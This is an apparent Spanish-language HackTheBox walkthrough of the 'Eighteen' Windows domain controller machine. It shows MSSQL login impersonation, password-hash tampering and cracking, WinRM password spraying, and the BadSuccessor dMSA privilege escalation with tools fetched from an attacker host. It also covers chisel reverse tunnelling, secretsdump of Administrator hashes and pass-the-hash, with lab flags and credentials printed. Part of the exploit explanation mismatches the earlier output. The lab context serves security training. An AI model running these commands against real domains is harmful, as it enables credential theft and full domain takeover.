---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Eighteen HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 11:20 PST
Nmap scan report for 10.10.11.95
Host is up (0.029s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-17T18:04:31
|_Not valid after:  2055-11-17T18:04:31
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-17T18:33:00+00:00; -48m07s from scanner time.
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -48m07s, deviation: 0s, median: -48m07s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
```

Veremos cosas interesantes, pero entre ellas el puerto `80` que tambien vemos que nos esta redirigiendo al dominio llamado `eighteen.htb`, tambien es muy interesante ese `SQL Server`, pero de primeras vamos añadir el dominio al archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            eighteen.htb
```

Ahora si entramos por el dominio veremos una pagina normal aparentemente, pero vamos a probar a entrar con las credenciales que nos proporcionan en `HTB` por `SQL Server` de esta forma:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-17 124537.png" alt=""><figcaption></figcaption></figure>

```
User: kevin
Pass: iNa2we6haRj2gaw!
```

Vamos a conectarnos de esta forma:

```shell
impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@<IP>'
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (kevin  guest@master)>
```

Veremos que ha funcionado, por lo que vamos a probar si tenemos el modulo de ejecuccion, pero veremos que no, si investigamos un poco mas, vemos que hay varios usuarios y si probamos a cambiarnos al `appdev` funcionara.

Vamos a listar los usuarios.

```shell
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S', 'U', 'G') AND name NOT LIKE '##%';
```

Info:

```
name type_desc is_disabled 
------ --------- ----------- 
sa     SQL_LOGIN        0 
kevin  SQL_LOGIN        0 
appdev SQL_LOGIN        0
```

Ahora vamos a cambiarnos al usuario `appdev`.

```mysql
EXEC AS LOGIN = 'appdev';
```

Info:

```
SQL (appdev  appdev@financial_planner)>
```

Vemos que funciona, por lo que vamos a investigar un poco que podemos hacer con dicho usuario.

Vemos que podemos cambiar la contraseña del usuario `admin` dentro de la `DDBB` en la que estamos, por lo que vamos a crearnos un script en `python3` para generar la contraseña del `hash` de forma correcta.

> generateHash.py

```python
import hashlib
import binascii

def generate_pbkdf2(password, salt="newsalt123"):
    iterations = 600000
    derived_key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), iterations)
    derived_hex = binascii.hexlify(derived_key).decode()
    return f"pbkdf2:sha256:{iterations}${salt}${derived_hex}"

# Elige una contraseña que quieras usar
password = "Password123"  # Cambia esta contraseña
hash_result = generate_pbkdf2(password)
print(f"Hash generado: {hash_result}")
print(f"Contraseña: {password}")
```

Ahora vamos a ejecutarlo de esta forma:

```shell
python3 generateHash.py
```

Info:

```
Hash generado: pbkdf2:sha256:600000$newsalt123$0e83734cb10c767d33deb3cf359aae3a0b28aad20cd4d04cacddbf87311cceeb
Contraseña: Password123
```

Desde el `SQL Server` vamos a modificar la contraseña de esta forma:

```mysql
UPDATE users SET password_hash = 'pbkdf2:sha256:600000$newsalt123$0e83734cb10c767d33deb3cf359aae3a0b28aad20cd4d04cacddbf87311cceeb' WHERE id = 1002;
```

Habiendo hecho esto, vamos a la pagina, le damos a `Login` y metemos estas credenciales:

```
User: admin
Pass: Password123
```

Hecho esto veremos que ha funcionado y estaremos dentro de la pagina como el usuario `admin`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-17 133005.png" alt=""><figcaption></figcaption></figure>

Veremos que hay un `Panel de admin` si entramos dentro veremos poca cosa.

## Escalate user adam.scott

### Crackeo Hash Admin

Si investigamos mas el `hash` del usuario `admin` de la `DDBB` podremos ver que si se puede `crackear`, vamos a crear antes un script con `python3` para formar bien dicho `hash` y `crackearlo` directamente.

> crackerHash.py

```python
#!/usr/bin/env python3
"""
Cracker directo de PBKDF2-SHA256
"""

import hashlib
import binascii

def crack_pbkdf2(target_hash, wordlist_path):
    """Intenta crackear el hash con una wordlist"""
    
    # Parsear el hash
    parts = target_hash.replace('pbkdf2:sha256:', '').split('$')
    iterations = int(parts[0])
    salt = parts[1]
    target_hash_hex = parts[2]
    
    print(f"[+] Target: {target_hash_hex}")
    print(f"[+] Salt: {salt}")
    print(f"[+] Iterations: {iterations}")
    print(f"[+] Wordlist: {wordlist_path}")
    print("-" * 50)
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for i, password in enumerate(f):
                password = password.strip()
                
                if not password:
                    continue
                
                # Generar hash PBKDF2
                derived_key = hashlib.pbkdf2_hmac(
                    'sha256',
                    password.encode('utf-8'),
                    salt.encode('utf-8'),
                    iterations
                )
                
                current_hash = binascii.hexlify(derived_key).decode('utf-8')
                
                # Verificar si coincide
                if current_hash == target_hash_hex:
                    print(f"\n🎉 ¡CONTRASEÑA ENCONTRADA!")
                    print(f"🔑 Password: {password}")
                    return password
                
                # Mostrar progreso cada 10000 intentos
                if i % 10000 == 0 and i > 0:
                    print(f"[+] Probadas: {i} contraseñas... Última: {password}")
            
            print(f"\n❌ Contraseña no encontrada en la wordlist")
            return None
            
    except FileNotFoundError:
        print(f"❌ Wordlist no encontrada: {wordlist_path}")
        return None
    except KeyboardInterrupt:
        print(f"\n⏹️  Búsqueda interrumpida por el usuario")
        return None

if __name__ == "__main__":
    target_hash = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
    wordlist = "/usr/share/wordlists/rockyou.txt"
    
    crack_pbkdf2(target_hash, wordlist)
```

Lo vamos a ejecutar de esta forma:

```shell
python3 crackerHash.py
```

Info:

```
[+] Target: 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
[+] Salt: AMtzteQIG7yAbZIa
[+] Iterations: 600000
[+] Wordlist: /usr/share/wordlists/rockyou.txt
--------------------------------------------------

🎉 ¡CONTRASEÑA ENCONTRADA!
🔑 Password: iloveyou1
```

Veremos que ha funcionado, por lo que habremos obtenido la contraseña de forma correcta.

### Fuerza bruta con netexec

Teniendo una contraseña vamos a probar a enumerar usuarios con `netexec` para ver cuales son validos a nivel de sistema.

```shell
netexec mssql <IP> -u 'kevin' -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

Info:

```
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.10.11.95     1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.10.11.95     1433   DC01             501: EIGHTEEN\Guest
MSSQL       10.10.11.95     1433   DC01             502: EIGHTEEN\krbtgt
MSSQL       10.10.11.95     1433   DC01             512: EIGHTEEN\Domain Admins
MSSQL       10.10.11.95     1433   DC01             513: EIGHTEEN\Domain Users
MSSQL       10.10.11.95     1433   DC01             514: EIGHTEEN\Domain Guests
MSSQL       10.10.11.95     1433   DC01             515: EIGHTEEN\Domain Computers
MSSQL       10.10.11.95     1433   DC01             516: EIGHTEEN\Domain Controllers
MSSQL       10.10.11.95     1433   DC01             517: EIGHTEEN\Cert Publishers
MSSQL       10.10.11.95     1433   DC01             518: EIGHTEEN\Schema Admins
MSSQL       10.10.11.95     1433   DC01             519: EIGHTEEN\Enterprise Admins
MSSQL       10.10.11.95     1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
MSSQL       10.10.11.95     1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
MSSQL       10.10.11.95     1433   DC01             525: EIGHTEEN\Protected Users
MSSQL       10.10.11.95     1433   DC01             526: EIGHTEEN\Key Admins
MSSQL       10.10.11.95     1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.10.11.95     1433   DC01             528: EIGHTEEN\Forest Trust Accounts
MSSQL       10.10.11.95     1433   DC01             529: EIGHTEEN\External Trust Accounts
MSSQL       10.10.11.95     1433   DC01             553: EIGHTEEN\RAS and IAS Servers
MSSQL       10.10.11.95     1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
MSSQL       10.10.11.95     1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
MSSQL       10.10.11.95     1433   DC01             1000: EIGHTEEN\DC01$
MSSQL       10.10.11.95     1433   DC01             1101: EIGHTEEN\DnsAdmins
MSSQL       10.10.11.95     1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
MSSQL       10.10.11.95     1433   DC01             1601: EIGHTEEN\mssqlsvc
MSSQL       10.10.11.95     1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
MSSQL       10.10.11.95     1433   DC01             1603: EIGHTEEN\HR
MSSQL       10.10.11.95     1433   DC01             1604: EIGHTEEN\IT
MSSQL       10.10.11.95     1433   DC01             1605: EIGHTEEN\Finance
MSSQL       10.10.11.95     1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.10.11.95     1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.10.11.95     1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.10.11.95     1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.10.11.95     1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.10.11.95     1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green
```

Veremos varios usuarios interesantes, vamos a guardarlos en una lista de usuarios de esta forma:

> users.txt

```
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
```

Vamos a lanzar fuerza bruta con estos usuarios a `WinRM` con `netexec` y la contraseña que encontramos anteriormente:

```shell
netexec winrm <IP> -u users.txt -p 'iloveyou1'
```

Info:

```
WINRM       10.10.11.95     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.95     5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

Veremos que hemos encontrado una coincidencia con el usuario `adam.scott`, por lo que nos vamos a conectar con dicho usuario.

### evil-winrm

```shell
evil-winrm -i <IP> -u adam.scott -p 'iloveyou1'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents> whoami
eighteen\adam.scott
```

Veremos que ha funcionado, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
f89c7de2dcebec94bb9c4e57aa4dcc6d
```

## Escalate Privileges

Si enumeramos bastante veremos que tenemos un grupo muy interesante:

```powershell
whoami /groups
```

Info:

```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
EIGHTEEN\IT                                Group            S-1-5-21-1152179935-589108180-1989892463-1604 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Descubrimos el grupo `EIGHTEEN\IT` por lo que vamos a listar las `OUs` de dicho grupo.

> GetOUsIT.ps1

```powershell
function Get-BadSuccessorOUPermissions {
    <#
    .SYNOPSIS
        Lists every principal that can perform a BadSuccessor attack and the OUs where it holds the required permissions.

    .DESCRIPTION
        Scans all Organizational Units (OUs) for Access Control Entries (ACEs) granting permissions that could allow creation of a delegated Managed Service Account (dMSA),
        enabling a potential BadSuccessor privilege escalation attack.

        Built-in privileged identities (e.g., Domain Admins, Administrators, SYSTEM, Enterprise Admins) are excluded from results.
        This script does not evaluate DENY ACEs and therefore, some false positives may occur.

        Note: We do not expand group membership and the permissions list used may not be exhaustive. Indirect rights such as WriteDACL on the OU are considered.
    #>

    [CmdletBinding()]
    param ()

    # Cache for IsExcludedSID to reduce network calls
    $SidCache = @{}

    function Test-IsExcludedSID {
        Param ([string]$IdentityReference)

        if ($SidCache.ContainsKey($IdentityReference)) {
            return $SidCache[$IdentityReference]      # instant hit
        }

        try {
            if ($IdentityReference -match '^S-\d-\d+(-\d+)+$') {
                $sid = $IdentityReference
            } else {
                $sid = (New-Object System.Security.Principal.NTAccount($IdentityReference)).Translate([System.Security.Principal.SecurityIdentifier]).Value
            }
        } catch {
            Write-Verbose "Failed to translate $IdentityReference to SID: $_"
            $SidCache[$IdentityReference] = $false
            return $false
        }

        # Check excluded SID list and Enterprise Admins (RID 519)
        if (($sid -and ($excludedSids -contains $sid -or $sid.EndsWith("-519")))) {
            return $true
        }

        $isExcluded = ($sid -and ($excludedSids -contains $sid -or $sid.EndsWith('-519')))
        $SidCache[$IdentityReference] = $isExcluded   # remember result
        return $isExcluded
    }

    $domainSID = (Get-ADDomain).DomainSID.Value
    $excludedSids = @(
        "$domainSID-512",       # Domain Admins
        "S-1-5-32-544",         # Builtin Administrators
        "S-1-5-18"              # Local SYSTEM
    )

    # Setup the specific rights we look for, and on which kind of objects - add more attributes' guids as needed
    $relevantObjectTypes = @{"00000000-0000-0000-0000-000000000000"="All Objects";
                             "0feb936f-47b3-49f2-9386-1dedc2c23765"="msDS-DelegatedManagedServiceAccount";}

    # This could be modified to also get objects with indirect access, for example: $relevantRights = "CreateChild|WriteDACL"
    $relevantRights = "CreateChild|GenericAll|WriteDACL|WriteOwner"

    # This will hold the output - every principal that has the required permissions and is not excluded, and on which OUs
    $allowedIdentities = @{}

    $allOUs = Get-ADOrganizationalUnit -Filter * -Properties ntSecurityDescriptor | Select-Object DistinguishedName, ntSecurityDescriptor

    foreach ($ou in $allOUs) {
        foreach ($ace in $ou.ntSecurityDescriptor.Access) {
            if ($ace.AccessControlType -ne "Allow") {
                continue
            }
            if ($ace.ActiveDirectoryRights -notmatch $relevantRights) {
                continue
            }
            if (-not $relevantObjectTypes.ContainsKey($ace.ObjectType.Guid)) {
                continue
            }

            $identity = $ace.IdentityReference.Value
            if (Test-IsExcludedSID $identity) {
                continue
            }

            if (-not $allowedIdentities.ContainsKey($identity)) {
                $allowedIdentities[$identity] = [System.Collections.Generic.List[string]]::new()
            }
            $allowedIdentities[$identity].Add($ou.DistinguishedName)
        }

        # Check the owner
        $owner = $ou.ntSecurityDescriptor.Owner

        if (-not (Test-IsExcludedSID $owner)) {
            if (-not $allowedIdentities.ContainsKey($owner)) {
                $allowedIdentities[$owner] = [System.Collections.Generic.List[string]]::new()
            }
            $allowedIdentities[$owner].Add($ou.DistinguishedName)
        }
    }

    foreach ($id in $allowedIdentities.Keys) {
        [PSCustomObject]@{
            Identity = $id
            OUs      = $allowedIdentities[$id].ToArray()
        }
    }
}

# Auto-run if script is executed directly
if ($MyInvocation.InvocationName -ne '.') {
    Get-BadSuccessorOUPermissions @PSBoundParameters
}
```

Ahora vamos a ejecutar el script:

```powershell
.\GetOUsIT.ps1
```

Info:

```
Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```

Veremos un `OU` llamado `Staff` muy interesante, vamos a ver que podemos hacer con esto que sabemos.

### Exploit BadSuccessor

Investigando un poco por internet descubro una herramienta llamada `BadSuccessor` que esta en el siguiente repositorio de `GitHub`.

URL = [GitHub BadSuccessor Tool](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)

Una vez que nos descarguemos el archivo `.ps1` vamos abrir un server de `python3` para pasarnos de la maquina atacante el archivo a la maquina victima:

```shell
python3 -m http.server 80
```

Ahora desde la maquina victima:

```powershell
iwr http://<IP_ATTACKER>/BadSuccessor.ps1 -o BadSuccessor.ps1
```

Hecho todo esto, vamos a ejecutar la herramienta de esta forma:

```powershell
. .\BadSuccessor.ps1 # Importamos el modulo
BadSuccessor -Mode Exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "diseo" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -Domain "eighteen.htb"
```

Info:

```
Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
0
0
0
0
Successfully created and configured dMSA 'diseo'
Object adam.scott can now impersonate Administrator
```

Vemos que ha funcionado de forma correcta, vamos a explicar un poco mejor este proceso para que quede entendido.

#### ¿Qué es BadSuccessor?

**BadSuccessor** es una herramienta que explota una vulnerabilidad en Windows Server 2025 relacionada con **Delegated Managed Service Accounts (dMSA)** y el atributo `msDS-ManagedAccountPrecededByLink`.

***

#### Explicación detallada:

```powershell
BadSuccessor -Mode Exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "diseo" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -Domain "eighteen.htb"
```

#### Parámetros:

* **Path**: OU donde tienes permisos de creación (CreateChild)
* **Name**: Nombre del nuevo dMSA que vas a crear
* **DelegatedAdmin**: El usuario cuyos privilegios quieres heredar (Administrator)

***

**Creación del dMSA malicioso**

```
[*] Creating dMSA object...
```

Creó un nuevo Delegated Managed Service Account llamado `hackgmsa` en la OU Staff.

**Herencia de privilegios del Administrator**

```
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
```

**Este es el núcleo del ataque**:

* `msDS-ManagedAccountPrecededByLink` = Administrator
* `msDS-DelegatedMSAState` = 2

Esto hace que **hackgmsa$ herede TODOS los privilegios del Administrator**.

**Configuración de quién puede leer la password**

```
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = DC01$
```

Configuro que `DC01$` (la cuenta de computadora del Domain Controller) puede recuperar la password del gMSA `hackgmsa$`.

Dicho todo esto, sabemos que tenemos ya un dMSA creado, por lo que vamos aprovechar esto para poder solicitar un `TGT` como nuestro usuario y posteriormente solicitar un `TGS` de forma privilegiada para que podamos realizar funciones de `Administrador`.

Vamos a dumpearnos los `hashes` de los usuarios de esta forma, pero antes vamos a realizar una tunelizacion a nivel de `SOCK` para tener desde nuestra maquina atacante el acceso a todos los puertos internos mediante `proxychains`.

Para ello tendremos que descargarnos `chisel`.

URL = [GitHub Chisel.exe](https://github.com/jpillora/chisel/releases) URL = [GitHub Chisel Linux](https://github.com/jpillora/chisel/releases)

Una vez que nos lo hayamos descargado, vamos a pasarnoslo a la maquina victima el `.exe`.

Abrimos un servidor de `python3`...

```shell
python3 -m http.server 80
```

Nos descargamos la herramienta desde nuestro servidor de `python3`.

```powershell
iwr http://<IP_ATTACKER>/chisel.exe -o chisel.exe
```

Ahora desde la maquina victima vamos a ejecutar el `chisel` en modo `server`.

```shell
./chisel server -p 7777 --reverse
```

Info:

```
2025/11/19 11:08:53 server: Reverse tunnelling enabled
2025/11/19 11:08:53 server: Fingerprint XBWNB19ZErkrcIPc8yFrmC01NNfWEYLvxRIscsU/C5E=
2025/11/19 11:08:53 server: Listening on http://0.0.0.0:7777
```

Ahora desde la maquina victima ejecutamos el `cliente`, para que se conecte al servidor.

```powershell
.\chisel.exe client <IP_ATTACKER>:7777 R:socks R:123:127.0.0.1:123/udp
```

Info:

```
chisel.exe : 2025/11/19 10:46:19 client: Connecting to ws://10.10.14.112:7777
```

Configuramos el archivo de `proxychains`.

```shell
nano /etc/proxychains4.conf
```

Info:

```
# Dejamos esta ultima linea asi...
socks5  127.0.0.1 1080
```

Ahora desde nuestra maquina atacante, vamos a utilizar un modulo de `impacket` instalandolo en `pipx` que da menos problemas.

### RCE con TGS

```shell
pipx install impacket
```

Hecho esto vamos a solicitar el `TGT` y a la vez el `TGS` de forma privilegiada con dicho modulo que te lo hace todo en uno, aprovechando que tenemos el `dMSA` creado.

```shell
proxychains -q /root/.local/bin/getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate 'diseo$' -dc-ip <IP_VICTIM> -self -dmsa
```

Info:

```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating diseo$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:5c77a84a30266956923729039054fc0dc0dfef804ce43fc763c11b133a1a6c2e
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:016bae27ab9a2b3aea1fadbc82bcb9f8
[*] EncryptionTypes.rc4_hmac:02dea946934eb63affaea2154ed08505
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in diseo$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

Con esto veremos que ha funcionado, por lo que vamos a exportarla en una variable de `kerberos`.

```shell
export KRB5CCNAME=diseo\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

Y ahora vamos a probar dicho `TGS` a ver si funciona.

```shell
proxychains -q netexec smb <IP> -k --use-kcache -X 'whoami'
```

Info:

```
SMB         10.10.11.95     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:eighteen.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.95     445    DC01             [+] eighteen.htb\diseo$ from ccache (Pwn3d!)
SMB         10.10.11.95     445    DC01             [+] Executed command via wmiexec
SMB         10.10.11.95     445    DC01             eighteen\diseo$
```

Vemos que ha funcionado, por lo que ahora vamos a utilizar `secretdump` para poder dumpearnos dichos `hashes` de los usuarios.

```shell
proxychains -q impacket-secretsdump -k -no-pass DC01.eighteen.htb -just-dc-user Administrator
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up...
```

Ahora vamos a realizar un `Pass-The-Hash` mediante `WinRM` con el usuario `Administrador` de esta forma:

```shell
evil-winrm -i <IP> -u Administrator -H '0b133be956bfaddf9cea56701affddec'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
eighteen\administrator
```

Veremos que ha funcionado, por lo que vamos a leer la `flag` del usuario `admin`.

> root.txt

```
686597bf7d1ce0f6e1700fba5f7b7e1f
```
